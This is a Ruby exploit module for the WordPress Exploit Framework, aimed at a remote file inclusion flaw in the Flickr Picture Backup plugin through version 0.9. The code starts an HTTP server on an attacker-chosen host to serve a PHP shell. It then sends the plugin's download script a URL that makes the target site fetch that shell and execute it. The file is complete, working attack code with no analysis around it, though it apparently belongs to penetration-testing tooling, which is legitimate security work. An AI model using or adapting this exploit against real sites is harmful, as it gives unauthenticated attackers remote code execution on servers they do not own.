# frozen_string_literal: true

class Wpxf::Exploit::FlickrPictureBackupRfiShellUpload < Wpxf::Module
  include Wpxf
  include Wpxf::Net::HttpServer
  include Wpxf::WordPress::ShellUpload

  def initialize
    super

    update_info(
      name: 'Flickr Picture Backup RFI Shell Upload',
      desc: %(
        Flickr Picture Bacup suffers from a remote file inclusion vulnerability
        which allows unauthenticated users to download and execute a PHP shell
        hosted on a remote server.

        This module will host a HTTP server to serve the payload, and make a request
        to the target that will initiate the download and execution of the payload.
      ),
      author: [
        'Larry W. Cashdollar', # Discovery and disclosure
        'rastating'            # WPXF module
      ],
      references: [
        ['WPVDB', '8803'],
        ['URL', 'http://www.vapidlabs.com/advisory.php?v=190']
      ],
      date: 'Apr 26 2017'
    )

    register_options([
      StringOption.new(
        name: 'rfi_host',
        desc: 'The address of the host listening for a connection',
        required: true
      ),
      StringOption.new(
        name: 'rfi_path',
        desc: 'The path to access via the remote file inclusion request',
        default: Utility::Text.rand_alpha(8),
        required: true
      )
    ])
  end

  def check
    check_plugin_version_from_readme('flickr-picture-backup', '0.9')
  end

  def rfi_host
    normalized_option_value('rfi_host')
  end

  def rfi_path
    normalized_option_value('rfi_path')
  end

  def rfi_url
    "http://#{rfi_host}:#{http_server_bind_port}/#{rfi_path}/#{payload_name}"
  end

  def on_http_request(_path, _params, _headers)
    payload.encoded
  end

  def uploader_url
    normalize_uri(wordpress_url_plugins, 'flickr-picture-backup', 'flickr-picture-download.php')
  end

  def upload_request_params
    { 'url' => rfi_url }
  end

  def uploaded_payload_location
    normalize_uri(wordpress_url_uploads, 'flickr_backup', payload_name)
  end

  def payload_body_builder
    builder = Utility::BodyBuilder.new
    builder.add_field('url', rfi_url)
    builder
  end

  def execute_payload(url)
    stop_http_server
    super(url)
  end

  def run
    start_http_server true
    super
  end
end
